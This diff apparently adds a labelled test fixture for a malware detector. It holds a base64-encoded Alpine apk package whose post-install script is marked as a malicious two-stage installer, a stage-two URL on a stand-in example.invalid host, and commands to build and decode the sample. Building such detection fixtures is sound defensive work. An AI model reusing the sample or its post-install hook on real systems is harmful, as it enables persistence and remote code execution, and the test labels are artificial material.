@@ -1,0 +1,12 @@
+{
+ "material": "H4sIAAAAAAACA+3Uz2+iQBQHcM7+FaztbaMMv8QePCgCUmq1YsX20gw4AooDMkOlZv/40u5hs5u9bpts3+fyXt4cJvOS73TnnuPe2jPhH0INQ9ffa+PPipAu/+rf5wbSFEFEwgeoGMdlc6XwNRX7mOIDEQdiUlFeEsY6OCaUt5qDZ1I2c7mLOiVqCeB/1C1yxjspbVKQZZ+Ufx31fs+/jDSkQv4/wsU3KUypxJLWhrCoTAuel0+IyFsFq+GgPdGYO/zJHMrBbH7HzOliZEn6mBSyloSOzR8Ua3tVuLL90lsnzuIczJYTB91ZB81O1Hz++OCfAhr1cjN4nPoaJVaSrh1PyYIJ9l72qTPGyqKuNvf7Ec3MXPq+vT7isuh7XlxPraXJ3OedpR2q9aE4Wle3+3p8s1r4o76bLUvLmOtJuuLDXEcn82ioiuHspB2NZ9dRdOOfp+5KxZwfpRzb65V/kutKlalTLvvDsEDZ/eYcvz1tMGi3SJTkYvvyL1toiz/EEDPS08TOpunjip7TommapZE65SJ8jgAAAAAAAAAAAAAAAAAAAAAAAAD4TK8OqVmOACgAAB+LCAAAAAAAAgPt0TEOgkAUBNCtOQXGA7AixPMgIS4NJizcX6QxsdfE+F4zP9NM8dc8V9dxqrrbMC3hM+Lm0rZ7bt4zxrp+3c/+FM9NE8oYvmDNSzdv8+E/HQ/7+3Mqhj7dyzQWAQAAAAAAAAAAgB/wAOQPyZAAKAAA",
+ "rep": "apk",
+ "transform": null,
+ "key": "",
+ "expected": "v=3|language=bash|role=installer|verdict=malicious|attack=T1546.016|adapter=apk_post_install|stage_count=2|steps=apk_add,run_post_install|campaign_id=APK-0e1f2a3b|url=https://apk-0e1f2a3b.example.invalid/s2",
+ "decoy": false,
+ "generator_cmd": "python3 -I -c 'tarfile(w, PAX) + gzip.compress(mtime=0)' -> gz(tar .PKGINFO + .post-install) + gz(tar usr/bin/agent) concatenated (Alpine apk v2 layout, stdlib tarfile/gzip writer); .post-install = printf '#!/bin/sh\\ndescriptor_0e1f2a3b=\"%s\"...' \"$M\"; material = base64 -w0",
+ "oracle_cmd": "tar -xzOf pkg_apk_post_install.apk --ignore-zeros .post-install | grep -o 'H4sI[A-Za-z0-9+/=]*' | base64 -d | gunzip",
+ "source_file": "pkg_apk_post_install.apk",
+ "note": "linux-package-maintainer-scripts (T1546.016 / T1059.004): decode(rep=apk) -> pkg_scripts -> script body readers"
+}
